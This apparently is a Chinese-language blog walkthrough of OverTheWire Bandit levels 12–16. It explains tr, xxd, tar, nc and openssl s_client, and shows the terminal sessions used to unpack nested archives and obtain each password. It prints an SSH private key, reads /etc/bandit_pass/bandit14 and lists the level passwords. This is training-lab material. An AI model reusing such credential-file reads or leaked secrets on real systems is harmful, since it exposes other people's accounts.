相同长度为止</span><br><span class="line">[CHAR*REPEAT] ：这也是 SET2 专用的设定，功能是重复指定的字符到设定的 REPEAT 次数为止(REPEAT 的数字采 8 进位制计算，以 0 为开始)</span><br><span class="line">[:alnum:] ：所有字母字符与数字</span><br><span class="line">[:alpha:] ：所有字母字符</span><br><span class="line">[:blank:] ：所有水平空格</span><br><span class="line">[:cntrl:] ：所有控制字符</span><br><span class="line">[:digit:] ：所有数字</span><br><span class="line">[:graph:] ：所有可打印的字符(不包含空格符)</span><br><span class="line">[:lower:] ：所有小写字母</span><br><span class="line">[:print:] ：所有可打印的字符(包含空格符)</span><br><span class="line">[:punct:] ：所有标点字符</span><br><span class="line">[:space:] ：所有水平与垂直空格符</span><br><span class="line">[:upper:] ：所有大写字母</span><br><span class="line">[:xdigit:] ：所有 16 进位制的数字</span><br><span class="line">[=CHAR=] ：所有符合指定的字符(等号里的 CHAR，代表你可自订的字符)</span><br></pre></td></tr></table></figure><br>看几个结果就懂了<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# echo &quot;abcdefghijklmnopqrstuvwxyz&quot; | tr &apos;abc&apos; &apos;123&apos;</span><br><span class="line">123defghijklmnopqrstuvwxyz</span><br></pre></td></tr></table></figure><br>这个是set1和set2相等字符数，直接替换</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# echo &quot;abcdefghijklmnopqrstuvwxyz&quot; | tr &apos;abcd&apos; &apos;123&apos;</span><br><span class="line">1233efghijklmnopqrstuvwxyz</span><br></pre></td></tr></table></figure>
<p>这个是set1大于set2，于是后面都用set2最后一个字符替换</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# echo &quot;abcdefghijklmnopqrstuvwxyz&quot; | tr -t &apos;abcd&apos; &apos;123&apos;</span><br><span class="line">123defghijklmnopqrstuvwxyz</span><br></pre></td></tr></table></figure>
<p>加了参数t以后全部按位替换</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost ~]# echo &quot;aaAA1bbBB2ccCC3&quot; | tr -s &apos;a-zA-Z&apos;</span><br><span class="line">aA1bB2cC3</span><br></pre></td></tr></table></figure>
<p>-s参数是删除连续字符</p>
<h2 id="bandit-12-13"><a href="#bandit-12-13" class="headerlink" title="bandit 12-13"></a>bandit 12-13</h2><p>Level Goal<br>The password for the next level is stored in the file data.txt, which is a hexdump of a file that has been repeatedly compressed. For this level it may be useful to create a directory under /tmp in which you can work using mkdir. For example: mkdir /tmp/myname123. Then copy the datafile using cp, and rename it using mv (read the manpages!)<br>Commands you may need to solve this level<br>grep, sort, uniq, strings, base64, tr, tar, gzip, bzip2, xxd, mkdir, cp, mv<br>题目告诉我们给我们了个hexdump文件，我们需要copy到/tmp自己文件夹以后可能要用到xxd转二进制然后解压压缩包<br>Linux xxd<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">xxd 命令用于使用二进制或十六进制格式显示文件内容，可以将指定文件或标准输入以十六进制转储,也可以把十六进制转储转换成原来的二进制形式。</span><br><span class="line">以十六进制格式输出：</span><br><span class="line">od [选项] 文件</span><br><span class="line">od -d 文件  十进制输出</span><br><span class="line">   -o 文件  八进制输出</span><br><span class="line">   -x 文件  十六进制输出</span><br><span class="line">xxd 文件  输出十六进制</span><br></pre></td></tr></table></figure><br>mv命令<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">mv命令是move的缩写，可以用来移动文件或者将文件改名（move (rename) files），是Linux系统下常用的命令，经常用来备份文件或者目录。</span><br><span class="line">1．命令格式：</span><br><span class="line">    mv [选项] 源文件或目录 目标文件或目录</span><br><span class="line">2．命令功能：</span><br><span class="line">视mv命令中第二个参数类型的不同（是目标文件还是目标目录），mv命令将文件重命名或将其移至一个新的目录中。当第二个参数类型是文件时，mv命令完成文件重命名，此时，源文件只能有一个（也可以是源目录名），它将所给的源文件或目录重命名为给定的目标文件名。当第二个参数是已存在的目录名称时，源文件或目录参数可以有多个，mv命令将各参数指定的源文件均移至目标目录中。在跨文件系统移动文件时，mv先拷贝，再将原有文件删除，而链至该文件的链接也将丢失。</span><br><span class="line">3．命令参数：</span><br><span class="line">-b ：若需覆盖文件，则覆盖前先行备份。 </span><br><span class="line">-f ：force 强制的意思，如果目标文件已经存在，不会询问而直接覆盖；</span><br><span class="line">-i ：若目标文件 (destination) 已经存在时，就会询问是否覆盖！</span><br><span class="line">-u ：若目标文件已经存在，且 source 比较新，才会更新(update)</span><br><span class="line">-t ： --target-directory=DIRECTORY move all SOURCE arguments into DIRECTORY，即指定mv的目标目录，该选项适用于移动多个源文件到一个目录的情况，此时目标目录在前，源文件在后。</span><br></pre></td></tr></table></figure><br>tar解压命令<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">解压</span><br><span class="line">语法：tar [主选项+辅选项] 文件或者目录</span><br><span class="line">使用该命令时，主选项是必须要有的，它告诉tar要做什么事情，辅选项是辅助使用的，可以选用。</span><br><span class="line">主选项：</span><br><span class="line">c 创建新的档案文件。如果用户想备份一个目录或是一些文件，就要选择这个选项。</span><br><span class="line">r 把要存档的文件追加到档案文件的未尾。例如用户已经作好备份文件，又发现还有一个目录或是一些文件忘记备份了，这时可以使用该选项，将忘记的目录或文件追加到备份文件中。</span><br><span class="line">t 列出档案文件的内容，查看已经备份了哪些文件。</span><br><span class="line">u 更新文件。就是说，用新增的文件取代原备份文件，如果在备份文件中找不到要更新的文件，则把它追加到备份文件的最后。</span><br><span class="line">x 从档案文件中释放文件。</span><br><span class="line">辅助选项：</span><br><span class="line">b 该选项是为磁带机设定的。其后跟一数字，用来说明区块的大小，系统预设值为20（20*512 bytes）。</span><br><span class="line">f 使用档案文件或设备，这个选项通常是必选的。</span><br><span class="line">k 保存已经存在的文件。例如我们把某个文件还原，在还原的过程中，遇到相同的文件，不会进行覆盖。</span><br><span class="line">m 在还原文件时，把所有文件的修改时间设定为现在。</span><br><span class="line">M 创建多卷的档案文件，以便在几个磁盘中存放。</span><br><span class="line">v 详细报告tar处理的文件信息。如无此选项，tar不报告文件信息。</span><br><span class="line">w 每一步都要求确认。</span><br><span class="line">f 这个参数确实是必选的,要不你就找不到你的tar文件</span><br><span class="line">其实用的时候感觉上有些多余,既然它是必选,那就干脆固化到tar这个命令本身就是啊</span><br><span class="line">可是它偏偏不是这样的,如果你不用这个参数,他就告述你什么&quot;文件不存在&quot;的错误</span><br><span class="line">叫人觉得这是一个设计不良的软件(或称命令把)</span><br><span class="line">v 也很重要,通常就能看出详细信息</span><br><span class="line">所以构造tar包通常是用命令</span><br><span class="line">tar cvf tar包名.tar 目录,文件列表</span><br><span class="line">所谓目录文件列表就是以空格形式分割文件和目录</span><br><span class="line">而解tar包通常是命令</span><br><span class="line">tar xvf tar包名.tar 目录,文件列表</span><br></pre></td></tr></table></figure><br>接下来是完整演示<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line">bandit12@bandit:~$ ls</span><br><span class="line">data.txt</span><br><span class="line">bandit12@bandit:~$ mkdir /tmp/bobose3</span><br><span class="line">mkdir: cannot create directory ‘/tmp/bobose3’: File exists</span><br><span class="line">bandit12@bandit:~$ mkdir /tmp/bobo123</span><br><span class="line">bandit12@bandit:~$ cp data.txt /tmp/bobo123</span><br><span class="line">bandit12@bandit:~$ cd /tmp/bobo123</span><br><span class="line">bandit12@bandit:/tmp/bobo123$ ls</span><br><span class="line">data.txt</span><br><span class="line">bandit12@bandit:/tmp/bobo123$ xxd -r data.txt bobo</span><br><span class="line">bandit12@bandit:/tmp/bobo123$ lsa</span><br><span class="line">-bash: lsa: command not found</span><br><span class="line">bandit12@bandit:/tmp/bobo123$ ls</span><br><span class="line">bobo  data.txt</span><br><span class="line">bandit12@bandit:/tmp/bobo123$ file bobo </span><br><span class="line">bobo: gzip compressed data, was &quot;data2.bin&quot;, last modified: Tue Oct 16 12:00:23 2018, max compression, from Unix</span><br><span class="line">bandit12@bandit:/tmp/bobo123$ mv bobo bobo.gz</span><br><span class="line">bandit12@bandit:/tmp/bobo123$ ls</span><br><span class="line">bobo.gz  data.txt</span><br><span class="line">bandit12@bandit:/tmp/bobo123$ gzip -d bobo.gz </span><br><span class="line">bandit12@bandit:/tmp/bobo123$ file b</span><br><span class="line">bandit12@bandit:/tmp/bobo123$ file bobo </span><br><span class="line">bobo: bzip2 compressed data, block size = 900k</span><br><span class="line">bandit12@bandit:/tmp/bobo123$ mv bobo bobo.bz2</span><br><span class="line">bandit12@bandit:/tmp/bobo123$ bzip2 -d bobo.bz2 </span><br><span class="line">bandit12@bandit:/tmp/bobo123$ file bobo </span><br><span class="line">bobo: gzip compressed data, was &quot;data4.bin&quot;, last modified: Tue Oct 16 12:00:23 2018, max compression, from Unix</span><br><span class="line">bandit12@bandit:/tmp/bobo123$ ls</span><br><span class="line">bobo  data.txt</span><br><span class="line">bandit12@bandit:/tmp/bobo123$ mv bobo bobo.gz</span><br><span class="line">bandit12@bandit:/tmp/bobo123$ gzip -d bobo.gz </span><br><span class="line">bandit12@bandit:/tmp/bobo123$ file bobo </span><br><span class="line">bobo: POSIX tar archive (GNU)</span><br><span class="line">bandit12@bandit:/tmp/bobo123$ tar -xvf bobo</span><br><span class="line">data5.bin</span><br><span class="line">bandit12@bandit:/tmp/bobo123$ ls</span><br><span class="line">bobo  data5.bin  data.txt</span><br><span class="line">bandit12@bandit:/tmp/bobo123$ file data5.bin </span><br><span class="line">data5.bin: POSIX tar archive (GNU)</span><br><span class="line">bandit12@bandit:/tmp/bobo123$ tar -xvf data5.bin</span><br><span class="line">data6.bin</span><br><span class="line">bandit12@bandit:/tmp/bobo123$ ls</span><br><span class="line">bobo  data5.bin  data6.bin  data.txt</span><br><span class="line">bandit12@bandit:/tmp/bobo123$ file data6.bin </span><br><span class="line">data6.bin: bzip2 compressed data, block size = 900k</span><br><span class="line">bandit12@bandit:/tmp/bobo123$ mv data6.bin data6.bz2</span><br><span class="line">bandit12@bandit:/tmp/bobo123$ bzip2 -d data6.bz2 </span><br><span class="line">bandit12@bandit:/tmp/bobo123$ ls</span><br><span class="line">bobo  data5.bin  data6  data.txt</span><br><span class="line">bandit12@bandit:/tmp/bobo123$ file data6</span><br><span class="line">data6: POSIX tar archive (GNU)</span><br><span class="line">bandit12@bandit:/tmp/bobo123$ tar -xvf data6</span><br><span class="line">data8.bin</span><br><span class="line">bandit12@bandit:/tmp/bobo123$ file data8.bin </span><br><span class="line">data8.bin: gzip compressed data, was &quot;data9.bin&quot;, last modified: Tue Oct 16 12:00:23 2018, max compression, from Unix</span><br><span class="line">bandit12@bandit:/tmp/bobo123$ ls</span><br><span class="line">bobo  data5.bin  data6  data8.bin  data.txt</span><br><span class="line">bandit12@bandit:/tmp/bobo123$ mv data8.bin data8.gz</span><br><span class="line">bandit12@bandit:/tmp/bobo123$ gzip -d data8.gz</span><br><span class="line">bandit12@bandit:/tmp/bobo123$ ls</span><br><span class="line">bobo  data5.bin  data6  data8  data.txt</span><br><span class="line">bandit12@bandit:/tmp/bobo123$ file data8</span><br><span class="line">data8: ASCII text</span><br><span class="line">bandit12@bandit:/tmp/bobo123$ cat data8</span><br><span class="line">The password is 8ZjyCRiBWFYkneahHwxCv3wb2a1ORpYL</span><br></pre></td></tr></table></figure><br>这个题，我真的服了。。。我都怀疑自己是不是做错了。。。给出题人打call</p>
<h2 id="bandit-13-14"><a href="#bandit-13-14" class="headerlink" title="bandit 13-14"></a>bandit 13-14</h2><p>Level Goal<br>The password for the next level is stored in /etc/bandit_pass/bandit14 and can only be read by user bandit14. For this level, you don’t get the next password, but you get a private SSH key that can be used to log into the next level. Note: localhost is a hostname that refers to the machine you are working on<br>Commands you may need to solve this level<br>ssh, telnet, nc, openssl, s_client, nmap<br>这一关主要就是要让我们使用私钥文件去登陆bandit14用户然后查看密码通往下一关<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">bandit13@bandit:~$ ls</span><br><span class="line">sshkey.private</span><br><span class="line">bandit13@bandit:~$ strings sshkey.private </span><br><span class="line">-----BEGIN RSA PRIVATE KEY-----</span><br><span class="line">MIIEpAIBAAKCAQEAxkkOE83W2cOT7IWhFc9aPaaQmQDdgzuXCv+ppZHa++buSkN+</span><br><span class="line">gg0tcr7Fw8NLGa5+Uzec2rEg0WmeevB13AIoYp0MZyETq46t+jk9puNwZwIt9XgB</span><br><span class="line">ZufGtZEwWbFWw/vVLNwOXBe4UWStGRWzgPpEeSv5Tb1VjLZIBdGphTIK22Amz6Zb</span><br><span class="line">ThMsiMnyJafEwJ/T8PQO3myS91vUHEuoOMAzoUID4kN0MEZ3+XahyK0HJVq68KsV</span><br><span class="line">ObefXG1vvA3GAJ29kxJaqvRfgYnqZryWN7w3CHjNU4c/2Jkp+n8L0SnxaNA+WYA7</span><br><span class="line">jiPyTF0is8uzMlYQ4l1Lzh/8/MpvhCQF8r22dwIDAQABAoIBAQC6dWBjhyEOzjeA</span><br><span class="line">J3j/RWmap9M5zfJ/wb2bfidNpwbB8rsJ4sZIDZQ7XuIh4LfygoAQSS+bBw3RXvzE</span><br><span class="line">pvJt3SmU8hIDuLsCjL1VnBY5pY7Bju8g8aR/3FyjyNAqx/TLfzlLYfOu7i9Jet67</span><br><span class="line">xAh0tONG/u8FB5I3LAI2Vp6OviwvdWeC4nOxCthldpuPKNLA8rmMMVRTKQ+7T2VS</span><br><span class="line">nXmwYckKUcUgzoVSpiNZaS0zUDypdpy2+tRH3MQa5kqN1YKjvF8RC47woOYCktsD</span><br><span class="line">o3FFpGNFec9Taa3Msy+DfQQhHKZFKIL3bJDONtmrVvtYK40/yeU4aZ/HA2DQzwhe</span><br><span class="line">ol1AfiEhAoGBAOnVjosBkm7sblK+n4IEwPxs8sOmhPnTDUy5WGrpSCrXOmsVIBUf</span><br><span class="line">laL3ZGLx3xCIwtCnEucB9DvN2HZkupc/h6hTKUYLqXuyLD8njTrbRhLgbC9QrKrS</span><br><span class="line">M1F2fSTxVqPtZDlDMwjNR04xHA/fKh8bXXyTMqOHNJTHHNhbh3McdURjAoGBANkU</span><br><span class="line">1hqfnw7+aXncJ9bjysr1ZWbqOE5Nd8AFgfwaKuGTTVX2NsUQnCMWdOp+wFak40JH</span><br><span class="line">PKWkJNdBG+ex0H9JNQsTK3X5PBMAS8AfX0GrKeuwKWA6erytVTqjOfLYcdp5+z9s</span><br><span class="line">8DtVCxDuVsM+i4X8UqIGOlvGbtKEVokHPFXP1q/dAoGAcHg5YX7WEehCgCYTzpO+</span><br><span class="line">xysX8ScM2qS6xuZ3MqUWAxUWkh7NGZvhe0sGy9iOdANzwKw7mUUFViaCMR/t54W1</span><br><span class="line">GC83sOs3D7n5Mj8x3NdO8xFit7dT9a245TvaoYQ7KgmqpSg/ScKCw4c3eiLava+J</span><br><span class="line">3btnJeSIU+8ZXq9XjPRpKwUCgYA7z6LiOQKxNeXH3qHXcnHok855maUj5fJNpPbY</span><br><span class="line">iDkyZ8ySF8GlcFsky8Yw6fWCqfG3zDrohJ5l9JmEsBh7SadkwsZhvecQcS9t4vby</span><br><span class="line">9/8X4jS0P8ibfcKS4nBP+dT81kkkg5Z5MohXBORA7VWx+ACohcDEkprsQ+w32xeD</span><br><span class="line">qT1EvQKBgQDKm8ws2ByvSUVs9GjTilCajFqLJ0eVYzRPaY6f++Gv/UVfAPV4c+S0</span><br><span class="line">kAWpXbv5tbkkzbS0eaLPTKgLzavXtQoTtKwrjpolHKIHUz6Wu+n4abfAIRFubOdN</span><br><span class="line">/+aLoRQ0yBDRbdXMsZN/jvY44eM+xRLdRVyMmdPtP8belRi2E2aEzA==</span><br><span class="line">-----END RSA PRIVATE KEY-----</span><br></pre></td></tr></table></figure><br>这是我们得到的私钥<br>这里我们会用ssh -i 是密钥登陆<br>ssh -i /path/to/kp-1234abcd [user@]hostname<br>// -i 指明 identity_file。无参运行 ssh 可看帮助。<br>我们登陆到bandit14后ls -s发现没有有用的东西，看到题目提示：下一级别的密码存储在 / etc / bandit_pass / bandit14中<br>直接cat 试一下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">bandit14@bandit:~$ cat /etc/bandit_pass/bandit14</span><br><span class="line">4wcYUJFw0k0XLShlDzztnTBHiqxU3b3e</span><br></pre></td></tr></table></figure></p>
<h2 id="bandit-14-15"><a href="#bandit-14-15" class="headerlink" title="bandit 14-15"></a>bandit 14-15</h2><p>Level Goal<br>The password for the next level can be retrieved by submitting the password of the current level to port 30000 on localhost.<br>Commands you may need to solve this level<br>ssh, telnet, nc, openssl, s_client, nmap<br>这一关的意思是让我们本地登陆30000端口发送上一关密码，应该会得到下一关密码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">参数</span><br><span class="line">想要连接到某处: nc [-options] hostname port[s] [ports] …</span><br><span class="line">绑定端口等待连接: nc -l port [-options] [hostname] [port]</span><br><span class="line"></span><br><span class="line">-g&lt;网关&gt;：设置路由器跃程通信网关，最多设置8个;</span><br><span class="line">-G&lt;指向器数目&gt;：设置来源路由指向器，其数值为4的倍数;</span><br><span class="line">-h：在线帮助;</span><br><span class="line">-i&lt;延迟秒数&gt;：设置时间间隔，以便传送信息及扫描通信端口;</span><br><span class="line">-l：使用监听模式，监控传入的资料;</span><br><span class="line">-n：直接使用ip地址，而不通过域名服务器;</span><br><span class="line">-o&lt;输出文件&gt;：指定文件名称，把往来传输的数据以16进制字码倾倒成该文件保存;</span><br><span class="line">-p&lt;通信端口&gt;：设置本地主机使用的通信端口;</span><br><span class="line">-r：指定源端口和目的端口都进行随机的选择;</span><br><span class="line">-s&lt;来源位址&gt;：设置本地主机送出数据包的IP地址;</span><br><span class="line">-u：使用UDP传输协议;</span><br><span class="line">-v：显示指令执行过程;</span><br><span class="line">-w&lt;超时秒数&gt;：设置等待连线的时间;</span><br><span class="line">-z：使用0输入/输出模式，只在扫描通信端口时使用。</span><br><span class="line">用法：</span><br><span class="line">[A Server(192.168.1.1) B Client(192.168.1.2)]</span><br><span class="line">连接到远程主机:</span><br><span class="line">$nc -nvv 192.168.x.x 80</span><br><span class="line">连到192.168.x.x的TCP80端口.</span><br><span class="line">监听本地主机:</span><br><span class="line">$nc -l 80</span><br></pre></td></tr></table></figure><br>我们输入:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">bandit14@bandit:~$ nc localhost 30000</span><br><span class="line">4wcYUJFw0k0XLShlDzztnTBHiqxU3b3e</span><br><span class="line">Correct!</span><br><span class="line">BfMYroe26WYalil77FoDi9qh59eK5xNr</span><br></pre></td></tr></table></figure></p>
<h2 id="bandit-15-16"><a href="#bandit-15-16" class="headerlink" title="bandit 15-16"></a>bandit 15-16</h2><p>Level Goal<br>The password for the next level can be retrieved by submitting the password of the current level to port 30001 on localhost using SSL encryption.<br>Helpful note: Getting “HEARTBEATING” and “Read R BLOCK”? Use -ign_eof and read the “CONNECTED COMMANDS” section in the manpage. Next to ‘R’ and ‘Q’, the ‘B’ command also works in this version of that command…<br>Commands you may need to solve this level<br>ssh, telnet, nc, openssl, s_client, nmap<br>这里我们要用到s_client命令，下面介绍一下用法<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line">s_client为一个SSL/TLS客户端程序，与s_server对应，它不仅能与s_server进行通信，也能与任何使用ssl协议的其他服务程序进行通信.</span><br><span class="line">openssl s_client [-host host] [-port port] [-connect host:port] [-verify depth] [-cert filename] [-certform DER|PEM] [-key filename] [-keyform DER|PEM] [-pass arg] [-CApath directory] [-CAfile filename] [-reconnect][-pause] [-showcerts] [-debug] [-msg] [-state] [-nbio_test] [-nbio][-crlf] [-ign_eof] [-no_ign_eof] [-quiet] [-ssl2] [-ssl3] [-tls1_1] [-tls1_2] [-tls1] [-dtls1] [-no_ssl2][-no_ssl3] [-no_tls1] [-no_tls1_1] [-no_tls1_2] [-bugs] [-cipher cipherlist] [-starttls protocol] [-engine id] [-tlsextdebug] [-no_ticket] [-sess_out filename] [-sess_in filename] [-rand file(s)]</span><br><span class="line">-host host     - use -connect instead</span><br><span class="line"> -port port     - use -connect instead</span><br><span class="line"> -connect host:port - who to connect to (default is localhost:4433)</span><br><span class="line"> -verify arg   - turn on peer certificate verification</span><br><span class="line"> -cert arg     - certificate file to use, PEM format assumed</span><br><span class="line"> -certform arg - certificate format (PEM or DER) PEM default</span><br><span class="line"> -key arg      - Private key file to use, in cert file if</span><br><span class="line">                 not specified but cert file is.</span><br><span class="line"> -keyform arg  - key format (PEM or DER) PEM default</span><br><span class="line"> -pass arg     - private key file pass phrase source</span><br><span class="line"> -CApath arg   - PEM format directory of CA&apos;s</span><br><span class="line"> -CAfile arg   - PEM format file of CA&apos;s</span><br><span class="line"> -trusted_first - Use trusted CA&apos;s first when building the trust chain</span><br><span class="line"> -reconnect    - Drop and re-make the connection with the same Session-ID</span><br><span class="line"> -pause        - sleep(1) after each read(2) and write(2) system call</span><br><span class="line"> -showcerts    - show all certificates in the chain</span><br><span class="line"> -debug        - extra output</span><br><span class="line"> -msg          - Show protocol messages</span><br><span class="line"> -nbio_test    - more ssl protocol testing</span><br><span class="line"> -state        - print the &apos;ssl&apos; states</span><br><span class="line"> -nbio         - Run with non-blocking IO</span><br><span class="line"> -crlf         - convert LF from terminal into CRLF</span><br><span class="line"> -quiet        - no s_client output</span><br><span class="line"> -ign_eof      - ignore input eof (default when -quiet)</span><br><span class="line"> -no_ign_eof   - don&apos;t ignore input eof</span><br><span class="line"> -psk_identity arg - PSK identity</span><br><span class="line"> -psk arg      - PSK in hex (without 0x)</span><br><span class="line"> -ssl2         - just use SSLv2</span><br><span class="line"> -ssl3         - just use SSLv3</span><br><span class="line"> -tls1_2       - just use TLSv1.2</span><br><span class="line"> -tls1_1       - just use TLSv1.1</span><br><span class="line"> -tls1         - just use TLSv1</span><br><span class="line"> -dtls1        - just use DTLSv1</span><br><span class="line"> -mtu          - set the link layer MTU</span><br><span class="line"> -no_tls1_2/-no_tls1_1/-no_tls1/-no_ssl3/-no_ssl2 - turn off that protocol</span><br><span class="line"> -bugs         - Switch on all SSL implementation bug workarounds</span><br><span class="line"> -serverpref   - Use server&apos;s cipher preferences (only SSLv2)</span><br><span class="line"> -cipher       - preferred cipher to use, use the &apos;openssl ciphers&apos;</span><br><span class="line">                 command to see what is available</span><br><span class="line"> -starttls prot - use the STARTTLS command before starting TLS</span><br><span class="line">                 for those protocols that support it, where</span><br><span class="line">                 &apos;prot&apos; defines which one to assume.  Currently,</span><br><span class="line">                 only &quot;smtp&quot;, &quot;pop3&quot;, &quot;imap&quot;, &quot;ftp&quot; and &quot;xmpp&quot;</span><br><span class="line">                 are supported.</span><br><span class="line"> -engine id    - Initialise and use the specified engine</span><br><span class="line"> -rand file:file:...</span><br><span class="line"> -sess_out arg - file to write SSL session to</span><br><span class="line"> -sess_in arg  - file to read SSL session from</span><br><span class="line"> -servername host  - Set TLS extension servername in ClientHello</span><br><span class="line"> -tlsextdebug      - hex dump of all TLS extensions received</span><br><span class="line"> -status           - request certificate status from server</span><br><span class="line"> -no_ticket        - disable use of RFC4507bis session tickets</span><br><span class="line"> -nextprotoneg arg - enable NPN extension, considering named protocols supported (comma-separated list)</span><br><span class="line"> -legacy_renegotiation - enable use of legacy renegotiation (dangerous)</span><br><span class="line"> -use_srtp profiles - Offer SRTP key management with a colon-separated profile list</span><br><span class="line"> -keymatexport label   - Export keying material using label</span><br><span class="line"> -keymatexportlen len  - Export len bytes of keying material (default 20)</span><br></pre></td></tr></table></figure><br>我们开始做题<br> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span 